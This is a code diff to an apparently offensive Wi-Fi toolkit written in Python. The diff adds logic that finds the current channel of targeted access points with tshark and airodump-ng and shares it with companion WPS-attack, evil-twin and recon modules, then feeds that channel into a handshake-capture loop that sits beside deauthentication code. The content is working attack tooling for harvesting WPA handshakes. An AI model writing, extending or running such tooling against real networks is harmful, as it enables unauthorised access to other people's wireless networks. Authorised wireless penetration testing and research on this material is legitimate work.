@@ -202,6 +202,64 @@ def set_channel(ch):
     run(["iw", "dev", IFACE, "set", "channel", str(ch)])
 
 
+# ---- channel rediscovery (BSSID-anchored) ------------------------------------
+# The BSSID is immutable; the channel is volatile (2.4GHz auto-channel; 5GHz DFS radar moves). So
+# anchor on the BSSID and FIND its current channel instead of trusting the pinned config value. The
+# harvest is the always-on RF presence, so it rediscovers and PUBLISHES the current channel to
+# CHAN_DIR/<bssid> for the other tools (WPS/eviltwin/aprecon) to read.
+CHAN_DIR = WORK + "/channels"
+
+def publish_channel(bssid, ch):
+    try:
+        os.makedirs(CHAN_DIR, exist_ok=True)
+        with open(os.path.join(CHAN_DIR, bssid.replace(":", "")), "w") as f:
+            f.write(f"{ch} {time.time():.0f}\n")
+    except Exception:
+        pass
+
+def beacon_present(bssid, ch, secs=5):
+    """Cheap common-case check: is this BSSID beaconing on `ch` right now?"""
+    set_channel(ch)
+    r = run(["tshark", "-i", IFACE, "-a", f"duration:{secs}", "-n",
+             "-Y", f"wlan.bssid=={bssid}",
+             "-T", "fields", "-e", "wlan.bssid"], timeout=secs + 10)
+    return bool((getattr(r, "stdout", "") or "").strip())
+
+def scan_for_channel(bssid):
+    """Full 2.4+5GHz sweep (airodump hops; DFS heard passively) -> the BSSID's current channel."""
+    base = f"/tmp/chanscan_{bssid.replace(':', '')}"
+    for f in glob.glob(base + "*"):
+        try: os.remove(f)
+        except Exception: pass
+    run(["timeout", "24", "airodump-ng", "--band", "abg", "-w", base,
+         "--output-format", "csv", "--write-interval", "1", IFACE], timeout=32)
+    ch = None
+    try:
+        for line in open(base + "-01.csv", errors="ignore"):
+            cols = [c.strip() for c in line.split(",")]
+            if cols and cols[0].upper() == bssid.upper() and len(cols) > 3 and cols[3].isdigit():
+                ch = int(cols[3]); break
+    except Exception:
+        pass
+    for f in glob.glob(base + "*"):
+        try: os.remove(f)
+        except Exception: pass
+    return ch
+
+def resolve_channel(bssid, hint):
+    """The BSSID's current channel: confirm the pinned/hint channel cheaply, else rescan the band to
+    relocate (2.4 auto-channel or a 5GHz DFS move), publishing whatever we settle on. Scope-locked:
+    only ever follows THIS BSSID, never wanders to another network."""
+    if beacon_present(bssid, hint):
+        publish_channel(bssid, hint); return hint
+    log(f"{bssid}: not heard on ch{hint} - rescanning 2.4+5GHz to relocate")
+    ch = scan_for_channel(bssid)
+    if ch:
+        log(f"{bssid}: relocated to ch{ch} (was pinned ch{hint})"); publish_channel(bssid, ch); return ch
+    log(f"{bssid}: not found on any channel this pass - keeping hint ch{hint}")
+    return hint
+
+
 # ---- shared radio coexistence (WPA harvest <-> wps_attack) --------------------
 # One physical radio (wlan1) serves both the WPA handshake harvest and the WPS
 # module. Both stay in monitor mode; this flock just serialises who is allowed to
@@ -320,11 +378,14 @@ def deauth(bssid, stas):
 def capture():
     t0 = time.time()
     cyc = 0
+    # BSSID-anchored: find each target's CURRENT channel once per cycle (follows a moved AP)
+    resolved = {b: resolve_channel(b, c) for b, c in TARGETS}
     while time.time() - t0 < CAPTURE_BUDGET:
         cyc += 1
         for bssid, ch in TARGETS:
             if time.time() - t0 >= CAPTURE_BUDGET:
                 break
+            ch = resolved.get(bssid, ch)
             prefix = f"{CAPS}/hs_{bssid.replace(':', '')}"
             set_channel(ch)
             start_airodump(bssid, ch, prefix)
